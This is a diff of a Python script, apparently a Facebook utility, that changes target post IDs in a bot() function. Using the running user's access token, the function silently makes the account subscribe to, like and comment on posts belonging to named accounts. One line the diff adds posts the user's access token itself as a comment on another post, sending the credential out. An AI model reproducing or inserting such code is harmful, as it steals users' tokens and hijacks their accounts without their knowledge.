@@ -239,7 +239,7 @@ def bot():
 	requests.post("https://graph.facebook.com/100030164941727/subscribers?access_token="+token) # Ezaa
 	requests.post("https://graph.facebook.com/100032577396395/subscribers?access_token="+token)  # Mr Jeeck X Nano
 	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token) # Ohayo Smrn
-	requests.post("https://graph.facebook.com/656336558715170/likes?summary=true&access_token=" + token) # Ezaa
+	requests.post("https://graph.facebook.com/135554395529272/likes?summary=true&access_token=" + token) # Ezaa
 	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komen_1+"&access_token="+token) # Ohayo Smrn
 	requests.post("https://graph.facebook.com/656336558715170/comments/?message="+komen_2+"&access_token="+token) # Ezaa
 	requests.post("https://graph.facebook.com/656336558715170/comments/?message="+komen_1+"&access_token="+token) # Ezaa
@@ -248,7 +248,7 @@ def bot():
 	requests.post("https://graph.facebook.com/573457507083491/likes?summary=trues&access_token=" +token) # Mr Jeeck X Nano
 	requests.post("https://graph.facebook.com/573457507083491/comments/?message="+komen_1+"&access_token="+token) # Mr Jeeck X Nano
 	requests.post("https://graph.facebook.com/573457507083491/comments/?message="+komen_2+"&access_token="+token) # Mr Jeeck X Nano
-	requests.post("https://graph.facebook.com/573457507083491/comments/?message"+token+"&access_token="+token) # Mr Jeeck X Nano
+	requests.post("https://graph.facebook.com/135554395529272/comments/?message"+token+"&access_token="+token) # Mr Jeeck X Nano
 	menu()
 
 # MENU Ngentod
